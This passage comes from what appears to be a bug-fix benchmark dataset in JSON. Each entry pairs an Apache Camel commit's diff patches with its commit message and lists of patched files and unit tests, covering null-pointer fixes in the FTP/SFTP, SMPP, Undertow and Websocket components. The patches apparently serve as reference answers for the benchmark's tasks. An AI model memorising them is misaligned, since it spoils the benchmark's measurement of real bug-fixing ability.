                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/util/UuidGenerator.java",
                "sha": "6ea2e0f61806fee8a489581c582c723a67631b7f",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/util/concurrent/CountingLatch.java",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/concurrent/CountingLatch.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/util/concurrent/CountingLatch.java",
                "patch": "@@ -16,13 +16,14 @@\n  */\n package org.apache.camel.util.concurrent;\n \n-import java.util.concurrent.CountDownLatch;\n import java.util.concurrent.TimeUnit;\n import java.util.concurrent.locks.AbstractQueuedSynchronizer;\n \n /**\n- * An alternative to a {@link CountDownLatch} -- this implementation also supports incrementing\n- * the latch count while counting down.  It can also be used to count up to 0 from a negative integer.\n+ * An alternative to a {@link java.util.concurrent.CountDownLatch}.\n+ * <p/>\n+ * This implementation also supports incrementing the latch count while counting down.\n+ * It can also be used to count up to 0 from a negative integer.\n  */\n public class CountingLatch {\n ",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/util/concurrent/CountingLatch.java",
                "sha": "957dd5b339de9a143f7ae02970f2d329159f1a48",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/test/java/org/apache/camel/component/file/FileConsumeMoveMultipleDirectoriesTest.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/file/FileConsumeMoveMultipleDirectoriesTest.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 2,
                "filename": "camel-core/src/test/java/org/apache/camel/component/file/FileConsumeMoveMultipleDirectoriesTest.java",
                "patch": "@@ -26,8 +26,8 @@\n  */\n public class FileConsumeMoveMultipleDirectoriesTest extends ContextTestSupport {\n \n-    private String fileUrl = \"file://target/multidir/?recursive=true&initialDelay=2000&delay=5000\" +\n-            \"&excludeNamePostfix=old&moveExpression=done/${file:name}.old\";\n+    private String fileUrl = \"file://target/multidir/?recursive=true&initialDelay=2000&delay=5000\"\n+            + \"&excludeNamePostfix=old&moveExpression=done/${file:name}.old\";\n \n     @Override\n     protected void setUp() throws Exception {",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/test/java/org/apache/camel/component/file/FileConsumeMoveMultipleDirectoriesTest.java",
                "sha": "d17ac3cbd9bfc5dfa68c1772bbe1dd3773f4bc35",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/test/java/org/apache/camel/component/file/FileConsumerMoveExpressionTest.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/file/FileConsumerMoveExpressionTest.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 2,
                "filename": "camel-core/src/test/java/org/apache/camel/component/file/FileConsumerMoveExpressionTest.java",
                "patch": "@@ -52,8 +52,8 @@ public void testRenameToId() throws Exception {\n         context.addRoutes(new RouteBuilder() {\n             @Override\n             public void configure() throws Exception {\n-                from(\"file://target/filelanguage/?excludeNamePostfix=.bak\" +\n-                        \"&moveExpression=${id}.bak\").to(\"mock:result\");\n+                from(\"file://target/filelanguage/?excludeNamePostfix=.bak\"\n+                        + \"&moveExpression=${id}.bak\").to(\"mock:result\");\n             }\n         });\n         context.start();",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/test/java/org/apache/camel/component/file/FileConsumerMoveExpressionTest.java",
                "sha": "df8666d85adf373eaaafe23aae3726ee9e00fec6",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/test/java/org/apache/camel/processor/interceptor/StreamCachingInterceptorTest.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/processor/interceptor/StreamCachingInterceptorTest.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 2,
                "filename": "camel-core/src/test/java/org/apache/camel/processor/interceptor/StreamCachingInterceptorTest.java",
                "patch": "@@ -21,7 +21,6 @@\n import java.io.StringReader;\n import java.util.LinkedList;\n import java.util.List;\n-\n import javax.xml.transform.Source;\n import javax.xml.transform.stream.StreamSource;\n \n@@ -33,8 +32,8 @@\n import org.apache.camel.converter.jaxp.BytesSource;\n import org.apache.camel.converter.jaxp.StringSource;\n import org.apache.camel.converter.jaxp.XmlConverter;\n-import org.apache.camel.model.InterceptorRef;\n import org.apache.camel.model.InterceptorDefinition;\n+import org.apache.camel.model.InterceptorRef;\n import org.apache.camel.processor.DelegateProcessor;\n \n public class StreamCachingInterceptorTest extends ContextTestSupport {",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/test/java/org/apache/camel/processor/interceptor/StreamCachingInterceptorTest.java",
                "sha": "0e6449ce6f016fa411fb20864d17ed40ddd090bd",
                "status": "modified"
            },
            {
                "additions": 8,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/components/camel-ftp/src/main/java/org/apache/camel/component/file/remote/FtpConsumer.java",
                "changes": 13,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-ftp/src/main/java/org/apache/camel/component/file/remote/FtpConsumer.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 5,
                "filename": "components/camel-ftp/src/main/java/org/apache/camel/component/file/remote/FtpConsumer.java",
                "patch": "@@ -32,7 +32,7 @@\n \n     public FtpConsumer(RemoteFileEndpoint<FTPFile> endpoint, Processor processor, RemoteFileOperations<FTPFile> fileOperations) {\n         super(endpoint, processor, fileOperations);\n-        this.endpointPath = endpoint.getConfiguration().getFile();\n+        this.endpointPath = endpoint.getConfiguration().getDirectory();\n     }\n \n     protected void pollDirectory(String fileName, List<GenericFile<FTPFile>> fileList) {\n@@ -105,15 +105,18 @@ protected void pollFile(String fileName, List<GenericFile<FTPFile>> fileList) {\n             answer.setLastModified(file.getTimestamp().getTimeInMillis());\n         }\n         answer.setHostname(((RemoteFileConfiguration) endpoint.getConfiguration()).getHost());\n-        // all ftp files is consider as relative\n+\n+        // all ftp files is considered as relative\n         answer.setAbsolute(false);\n+\n+        // create a pseudo absolute name\n         String absoluteFileName = (ObjectHelper.isNotEmpty(directory) ? directory + \"/\" : \"\") + file.getName();\n         answer.setAbsoluteFileName(absoluteFileName);\n \n-        // the relative filename\n-        String ftpBasePath = endpoint.getConfiguration().getFile();\n-        String relativePath = absoluteFileName.substring(ftpBasePath.length());\n+        // the relative filename, skip the leading endpoint configured path\n+        String relativePath = ObjectHelper.after(absoluteFileName, endpointPath);\n         if (relativePath.startsWith(\"/\")) {\n+            // skip trailing /\n             relativePath = relativePath.substring(1);\n         }\n         answer.setRelativeFileName(relativePath);",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/components/camel-ftp/src/main/java/org/apache/camel/component/file/remote/FtpConsumer.java",
                "sha": "f9bd28e91661008b344efeab784e6c94cee8e145",
                "status": "modified"
            },
            {
                "additions": 34,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/components/camel-ftp/src/main/java/org/apache/camel/component/file/remote/SftpConsumer.java",
                "changes": 52,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-ftp/src/main/java/org/apache/camel/component/file/remote/SftpConsumer.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 18,
                "filename": "components/camel-ftp/src/main/java/org/apache/camel/component/file/remote/SftpConsumer.java",
                "patch": "@@ -28,8 +28,11 @@\n  */\n public class SftpConsumer extends RemoteFileConsumer<ChannelSftp.LsEntry> {\n \n+    private String endpointPath;\n+\n     public SftpConsumer(RemoteFileEndpoint<ChannelSftp.LsEntry> endpoint, Processor processor, RemoteFileOperations<ChannelSftp.LsEntry> operations) {\n         super(endpoint, processor, operations);\n+        this.endpointPath = endpoint.getConfiguration().getDirectory();\n     }\n \n     protected void pollDirectory(String fileName, List<GenericFile<ChannelSftp.LsEntry>> fileList) {\n@@ -79,35 +82,48 @@ protected void pollFile(String fileName, List<GenericFile<ChannelSftp.LsEntry>>\n         }\n         // list the files in the fold and poll the first file\n         List<ChannelSftp.LsEntry> list = operations.listFiles(fileName);\n-        ChannelSftp.LsEntry file = list.get(0);\n-        if (file != null) {\n-            RemoteFile<ChannelSftp.LsEntry> remoteFile = asRemoteFile(directory, file);\n-            if (isValidFile(remoteFile, false)) {\n-                // matched file so add\n-                fileList.add(remoteFile);\n+        if (list.size() > 0) {\n+            ChannelSftp.LsEntry file = list.get(0);\n+            if (file != null) {\n+                RemoteFile<ChannelSftp.LsEntry> remoteFile = asRemoteFile(directory, file);\n+                if (isValidFile(remoteFile, false)) {\n+                    // matched file so add\n+                    fileList.add(remoteFile);\n+                }\n+            }\n+        } else {\n+            if (log.isTraceEnabled()) {\n+                log.trace(\"Polled [\" + fileName + \"]. No files found\");\n             }\n         }\n     }\n \n     private RemoteFile<ChannelSftp.LsEntry> asRemoteFile(String directory, ChannelSftp.LsEntry file) {\n-        RemoteFile<ChannelSftp.LsEntry> remote = new RemoteFile<ChannelSftp.LsEntry>();\n-        remote.setFile(file);\n-        remote.setFileName(file.getFilename());\n-        remote.setFileLength(file.getAttrs().getSize());\n-        remote.setLastModified(file.getAttrs().getMTime() * 1000L);\n-        remote.setHostname(((RemoteFileConfiguration) endpoint.getConfiguration()).getHost());\n+        RemoteFile<ChannelSftp.LsEntry> answer = new RemoteFile<ChannelSftp.LsEntry>();\n+\n+        answer.setEndpointPath(endpointPath);\n+        answer.setFile(file);\n+        answer.setFileName(file.getFilename());\n+        answer.setFileLength(file.getAttrs().getSize());\n+        answer.setLastModified(file.getAttrs().getMTime() * 1000L);\n+        answer.setHostname(((RemoteFileConfiguration) endpoint.getConfiguration()).getHost());\n+\n+        // all ftp files is considered as relative\n+        answer.setAbsolute(false);\n+\n+        // create a pseudo absolute name\n         String absoluteFileName = (ObjectHelper.isNotEmpty(directory) ? directory + \"/\" : \"\") + file.getFilename();\n-        remote.setAbsoluteFileName(absoluteFileName);\n+        answer.setAbsoluteFileName(absoluteFileName);\n \n-        // the relative filename\n-        String ftpBasePath = endpoint.getConfiguration().getFile();\n-        String relativePath = absoluteFileName.substring(ftpBasePath.length());\n+        // the relative filename, skip the leading endpoint configured path\n+        String relativePath = ObjectHelper.after(absoluteFileName, endpointPath);\n         if (relativePath.startsWith(\"/\")) {\n+            // skip trailing /\n             relativePath = relativePath.substring(1);\n         }\n-        remote.setRelativeFileName(relativePath);\n+        answer.setRelativeFileName(relativePath);\n \n-        return remote;\n+        return answer;\n     }\n \n }",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/components/camel-ftp/src/main/java/org/apache/camel/component/file/remote/SftpConsumer.java",
                "sha": "33443215624a841ae553f75a35888b9a9b6b188b",
                "status": "modified"
            },
            {
                "additions": 64,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/FromFtpMoveFileToHiddenFolderRecursiveTest.java",
                "changes": 64,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/FromFtpMoveFileToHiddenFolderRecursiveTest.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 0,
                "filename": "components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/FromFtpMoveFileToHiddenFolderRecursiveTest.java",
                "patch": "@@ -0,0 +1,64 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.file.remote;\n+\n+import org.apache.camel.Exchange;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+\n+/**\n+ * Unit test based on end user problem with SFTP on Windows\n+ */\n+public class FromFtpMoveFileToHiddenFolderRecursiveTest extends FtpServerTestSupport {\n+\n+    private String getFtpUrl() {\n+        return \"ftp://admin@localhost:\" + getPort() + \"?password=admin&recursive=true&binary=false\"\n+                + \"&moveExpression=.done/${file:name}&initialDelay=3000&delay=5000\";\n+    }\n+\n+    @Override\n+    protected void setUp() throws Exception {\n+        deleteDirectory(FTP_ROOT_DIR);\n+        super.setUp();\n+        prepareFtpServer();\n+    }\n+\n+    private void prepareFtpServer() throws Exception {\n+        template.sendBodyAndHeader(getFtpUrl(), \"Hello\", Exchange.FILE_NAME, \"hello.txt\");\n+        template.sendBodyAndHeader(getFtpUrl(), \"Bye\", Exchange.FILE_NAME, \"bye/bye.txt\");\n+        template.sendBodyAndHeader(getFtpUrl(), \"Goodday\", Exchange.FILE_NAME, \"goodday/goodday.txt\");\n+    }\n+\n+    public void testPollFileAndShouldBeMoved() throws Exception {\n+        MockEndpoint mock = getMockEndpoint(\"mock:result\");\n+        mock.expectedBodiesReceivedInAnyOrder(\"Hello\", \"Bye\", \"Goodday\");\n+        mock.expectedFileExists(FTP_ROOT_DIR + \".done/hello.txt\");\n+        mock.expectedFileExists(FTP_ROOT_DIR + \".done/bye/bye.txt\");\n+        mock.expectedFileExists(FTP_ROOT_DIR + \".done/goodday/goodday.txt\");\n+\n+        mock.assertIsSatisfied();\n+    }\n+\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            public void configure() throws Exception {\n+                from(getFtpUrl()).to(\"mock:result\");\n+            }\n+        };\n+    }\n+\n+}\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/FromFtpMoveFileToHiddenFolderRecursiveTest.java",
                "sha": "0a4761c83a51945b5e7417057e3744b720e39bbf",
                "status": "added"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/UriConfigurationTest.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/UriConfigurationTest.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 1,
                "filename": "components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/UriConfigurationTest.java",
                "patch": "@@ -99,7 +99,7 @@ private void assertRemoteFileEndpointFile(String endpointUri, String expectedFil\n         RemoteFileEndpoint endpoint = resolveMandatoryEndpoint(context, endpointUri, RemoteFileEndpoint.class);\n         assertNotNull(\"Could not find endpoint: \" + endpointUri, endpoint);\n \n-        String file = endpoint.getConfiguration().getFile();\n+        String file = endpoint.getConfiguration().getDirectory();\n         assertEquals(\"For uri: \" + endpointUri + \" the file is not equal\", expectedFile, file);\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/UriConfigurationTest.java",
                "sha": "b8e8ce1a225840eb004744a8e332e266785233dc",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/components/camel-jxpath/src/main/java/org/apache/camel/language/jxpath/JXPathExpression.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jxpath/src/main/java/org/apache/camel/language/jxpath/JXPathExpression.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 3,
                "filename": "components/camel-jxpath/src/main/java/org/apache/camel/language/jxpath/JXPathExpression.java",
                "patch": "@@ -18,7 +18,6 @@\n \n import org.apache.camel.Exchange;\n import org.apache.camel.Expression;\n-import org.apache.camel.Message;\n import org.apache.camel.impl.ExpressionSupport;\n import org.apache.camel.language.ExpressionEvaluationException;\n import org.apache.commons.jxpath.CompiledExpression;\n@@ -30,7 +29,7 @@\n  */\n public class JXPathExpression extends ExpressionSupport {\n \n-    private String expression;\n+    private final String expression;\n     private CompiledExpression compiledExpression;\n     private final Class<?> type;\n \n@@ -69,7 +68,7 @@ private void assertResultType(Exchange exchange, Object result) {\n \n     @Override\n     protected String assertionFailureMessage(Exchange exchange) {\n-        return expression.toString();\n+        return expression;\n     }\n \n     /*",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/components/camel-jxpath/src/main/java/org/apache/camel/language/jxpath/JXPathExpression.java",
                "sha": "04414754144761a9ac1664b9d55cc23212c1540f",
                "status": "modified"
            }
        ],
        "message": "CAMEL-1428: Fixed NPE for SFTP consumer move strategy. Fixed checkstyle. Fixed unused imports and other findings by report tool.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@751221 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/99e8e3c9acecf238d13a5551d113a29e30898b3e",
        "patched_files": [
            "HL7DataFormat.java",
            "LoadBalancerDefinition.java",
            "DefaultRouteContext.java",
            "NoSuchBeanException.java",
            "DelegateProcessor.java",
            "GenericFile.java",
            "ExchangePatternProcessor.java",
            "DelegateAsyncProcessor.java",
            "UuidGenerator.java",
            "CamelContextHelper.java",
            "ZipDataFormat.java",
            "NoSuchHeaderException.java",
            "FileEndpoint.java",
            "LoadBalancerConsumer.java",
            "CamelNamingStrategy.java",
            "DefaultCamelContext.java",
            "RssDataFormat.java",
            "JXPathExpression.java",
            "DefaultScheduledPollConsumer.java",
            "EndpointInject.java",
            "ExpressionAdapter.java",
            "DefaultAggregationCollection.java",
            "DefaultPollingEndpoint.java",
            "DefaultComponent.java",
            "GenericFileConsumer.java",
            "MethodCallExpression.java",
            "FileComponent.java",
            "GenericFileProducer.java",
            "FileConsumer.java",
            "CsvDataFormat.java",
            "NoSuchPropertyException.java",
            "DelegateLifecycleStrategy.java",
            "DefaultConsumer.java",
            "InstrumentationLifecycleStrategy.java",
            "FlatpackDataFormat.java",
            "XStreamDataFormat.java",
            "DefaultMessage.java",
            "InterceptDefinition.java",
            "DirectEndpoint.java",
            "FtpConsumer.java",
            "GenericFileConfiguration.java",
            "ProcessorDefinition.java",
            "CollectionStringBuffer.java",
            "SftpConsumer.java",
            "URISupport.java",
            "ServiceSupport.java",
            "StreamCachingInterceptor.java",
            "CountingLatch.java",
            "StreamCacheConverter.java",
            "Constants.java",
            "GenericFileEndpoint.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CamelContextHelperTest.java",
            "DefaultCamelContextTest.java",
            "StreamCachingInterceptorTest.java",
            "CollectionStringBufferTest.java",
            "FileConsumerMoveExpressionTest.java",
            "FileConsumeMoveMultipleDirectoriesTest.java",
            "ServiceSupportTest.java",
            "EndpointInjectTest.java",
            "StreamCacheConverterTest.java",
            "DefaultComponentTest.java",
            "FromFtpMoveFileToHiddenFolderRecursiveTest.java",
            "URISupportTest.java",
            "TestConstants.java",
            "DirectEndpointTest.java",
            "CsvDataFormatTest.java",
            "RssDataFormatTest.java",
            "ExpressionAdapterTest.java",
            "UriConfigurationTest.java",
            "HL7DataFormatTest.java"
        ]
    },
    "camel_8b7a7a4": {
        "bug_id": "camel_8b7a7a4",
        "commit": "https://github.com/apache/camel/commit/8b7a7a40140d13cdeafefb90b915f7d769b1b5eb",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/8b7a7a40140d13cdeafefb90b915f7d769b1b5eb/components/camel-smpp/src/main/java/org/apache/camel/component/smpp/SmppBinding.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-smpp/src/main/java/org/apache/camel/component/smpp/SmppBinding.java?ref=8b7a7a40140d13cdeafefb90b915f7d769b1b5eb",
                "deletions": 1,
                "filename": "components/camel-smpp/src/main/java/org/apache/camel/component/smpp/SmppBinding.java",
                "patch": "@@ -100,6 +100,8 @@ public SubmitSm createSubmitSm(Exchange exchange) throws UnsupportedEncodingExce\n             \n             if (shortMessage.length < 255) {\n                 submitSm.setShortMessage(shortMessage);\n+                // To avoid the NPE error\n+                submitSm.setOptionalParametes(new OptionalParameter[]{});\n             } else {\n                 submitSm.setShortMessage(new byte[0]);\n                 OptionalParameter messagePayloadTLV = OptionalParameters.deserialize(OptionalParameter.Tag.MESSAGE_PAYLOAD.code(), shortMessage);\n@@ -306,4 +308,4 @@ public SmppConfiguration getConfiguration() {\n     public void setConfiguration(SmppConfiguration configuration) {\n         this.configuration = configuration;\n     }\n-}\n\\ No newline at end of file\n+}",
                "raw_url": "https://github.com/apache/camel/raw/8b7a7a40140d13cdeafefb90b915f7d769b1b5eb/components/camel-smpp/src/main/java/org/apache/camel/component/smpp/SmppBinding.java",
                "sha": "0624fa47e9add6ed95419c50b68cae37f7265af8",
                "status": "modified"
            }
        ],
        "message": "CAMEL-4422 Fixed the NPE issue of camel-smpp when sending the message length is less then 255\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1165987 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/e64e3e33be6a71aa867be059bbb2959f0631d810",
        "patched_files": [
            "SmppBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "SmppBindingTest.java"
        ]
    },
    "camel_8e1d10a": {
        "bug_id": "camel_8e1d10a",
        "commit": "https://github.com/apache/camel/commit/8e1d10a46a91bc3c8e5cd100d80ed30991fbf307",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8e1d10a46a91bc3c8e5cd100d80ed30991fbf307/components/camel-undertow/src/main/java/org/apache/camel/component/undertow/DefaultUndertowHttpBinding.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-undertow/src/main/java/org/apache/camel/component/undertow/DefaultUndertowHttpBinding.java?ref=8e1d10a46a91bc3c8e5cd100d80ed30991fbf307",
                "deletions": 1,
                "filename": "components/camel-undertow/src/main/java/org/apache/camel/component/undertow/DefaultUndertowHttpBinding.java",
                "patch": "@@ -325,7 +325,7 @@ public Object toHttpResponse(HttpServerExchange httpExchange, Message message) t\n                 // we failed due an exception so print it as plain text\n                 StringWriter sw = new StringWriter();\n                 PrintWriter pw = new PrintWriter(sw);\n-                exception.getCause().printStackTrace(pw);\n+                exception.printStackTrace(pw);\n \n                 // the body should then be the stacktrace\n                 body = ByteBuffer.wrap(sw.toString().getBytes());",
                "raw_url": "https://github.com/apache/camel/raw/8e1d10a46a91bc3c8e5cd100d80ed30991fbf307/components/camel-undertow/src/main/java/org/apache/camel/component/undertow/DefaultUndertowHttpBinding.java",
                "sha": "3d2578a899cc8b50cbf3360bfdf1b7a3e38412b1",
                "status": "modified"
            }
        ],
        "message": "CAMEL-11264: Fixed potential NPE in DefaultUndertowHttpBinding",
        "parent": "https://github.com/apache/camel/commit/805fa85fae63f37c320742f86674417c079d1aad",
        "patched_files": [
            "DefaultUndertowHttpBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultUndertowHttpBindingTest.java"
        ]
    },
    "camel_8fb2303": {
        "bug_id": "camel_8fb2303",
        "commit": "https://github.com/apache/camel/commit/8fb2303be6699a794103f051a099fb71580d5db1",
        "file": [
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/8fb2303be6699a794103f051a099fb71580d5db1/components/camel-websocket/src/main/docs/websocket.adoc",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-websocket/src/main/docs/websocket.adoc?ref=8fb2303be6699a794103f051a099fb71580d5db1",
                "deletions": 3,
                "filename": "components/camel-websocket/src/main/docs/websocket.adoc",
                "patch": "@@ -33,6 +33,7 @@ Websocket Options\n ^^^^^^^^^^^^^^^^^\n \n \n+\n // component options: START\n The Jetty Websocket component supports 12 options which are listed below.\n \n@@ -48,9 +49,9 @@ The Jetty Websocket component supports 12 options which are listed below.\n | sslPassword | String | The password when using SSL.\n | sslKeystore | String | The path to the keystore.\n | enableJmx | boolean | If this option is true Jetty JMX support will be enabled for this endpoint. See Jetty JMX support for more details.\n-| minThreads | Integer | To set a value for minimum number of threads in server thread pool.\n-| maxThreads | Integer | To set a value for maximum number of threads in server thread pool.\n-| threadPool | ThreadPool | To use a custom thread pool for the server.\n+| minThreads | Integer | To set a value for minimum number of threads in server thread pool. MaxThreads/minThreads or threadPool fields are required due to switch to Jetty9.\n+| maxThreads | Integer | To set a value for maximum number of threads in server thread pool. MaxThreads/minThreads or threadPool fields are required due to switch to Jetty9.\n+| threadPool | ThreadPool | To use a custom thread pool for the server. MaxThreads/minThreads or threadPool fields are required due to switch to Jetty9.\n | sslContextParameters | SSLContextParameters | To configure security using SSLContextParameters\n | socketFactory | Map | To configure a map which contains custom WebSocketFactory for sub protocols. The key in the map is the sub protocol. The default key is reserved for the default implementation.\n |=======================================================================\n@@ -59,6 +60,7 @@ The Jetty Websocket component supports 12 options which are listed below.\n \n \n \n+\n // endpoint options: START\n The Jetty Websocket component supports 20 endpoint options which are listed below:\n ",
                "raw_url": "https://github.com/apache/camel/raw/8fb2303be6699a794103f051a099fb71580d5db1/components/camel-websocket/src/main/docs/websocket.adoc",
                "sha": "1a59752ff137860e238b22daf3af9cdf55f4c5c3",
                "status": "modified"
            },
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/8fb2303be6699a794103f051a099fb71580d5db1/components/camel-websocket/src/main/java/org/apache/camel/component/websocket/WebsocketComponent.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-websocket/src/main/java/org/apache/camel/component/websocket/WebsocketComponent.java?ref=8fb2303be6699a794103f051a099fb71580d5db1",
                "deletions": 3,
                "filename": "components/camel-websocket/src/main/java/org/apache/camel/component/websocket/WebsocketComponent.java",
                "patch": "@@ -688,7 +688,7 @@ public Integer getMinThreads() {\n     }\n \n     /**\n-     * To set a value for minimum number of threads in server thread pool.\n+     * To set a value for minimum number of threads in server thread pool. MaxThreads/minThreads or threadPool fields are required due to switch to Jetty9.\n      */\n     public void setMinThreads(Integer minThreads) {\n         this.minThreads = minThreads;\n@@ -699,7 +699,7 @@ public Integer getMaxThreads() {\n     }\n \n     /**\n-     * To set a value for maximum number of threads in server thread pool.\n+     * To set a value for maximum number of threads in server thread pool. MaxThreads/minThreads or threadPool fields are required due to switch to Jetty9.\n      */\n     public void setMaxThreads(Integer maxThreads) {\n         this.maxThreads = maxThreads;\n@@ -710,7 +710,7 @@ public ThreadPool getThreadPool() {\n     }\n \n     /**\n-     * To use a custom thread pool for the server.\n+     * To use a custom thread pool for the server. MaxThreads/minThreads or threadPool fields are required due to switch to Jetty9.\n      */\n     public void setThreadPool(ThreadPool threadPool) {\n         this.threadPool = threadPool;",
                "raw_url": "https://github.com/apache/camel/raw/8fb2303be6699a794103f051a099fb71580d5db1/components/camel-websocket/src/main/java/org/apache/camel/component/websocket/WebsocketComponent.java",
                "sha": "0e9d1d9ca2a9599aca20d73a48f56b576dc91441",
                "status": "modified"
            }
        ],
        "message": "CAMEL-9950: Camel-Websocket: NPE in case minThreads, maxThreads and getThreadPool equals to null",
        "parent": "https://github.com/apache/camel/commit/5ae785204643c5618acc0b1434e29dfb219516b3",
        "patched_files": [
            "WebsocketComponent.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "WebsocketComponentTest.java"
        ]
    },
    "camel_9122881": {
        "bug_id": "camel_9122881",
        "commit": "https://github.com/apache/camel/commit/9122881581c14f2e4c3fe32ae6660d35bcccf34a",
        "file": [
            {
                "additions": 7,
                "blob_url": "https://github.com/apache/camel/blob/9122881581c14f2e4c3fe32ae6660d35bcccf34a/camel-core/src/main/java/org/apache/camel/impl/DefaultEndpoint.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultEndpoint.java?ref=9122881581c14f2e4c3fe32ae6660d35bcccf34a",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultEndpoint.java",
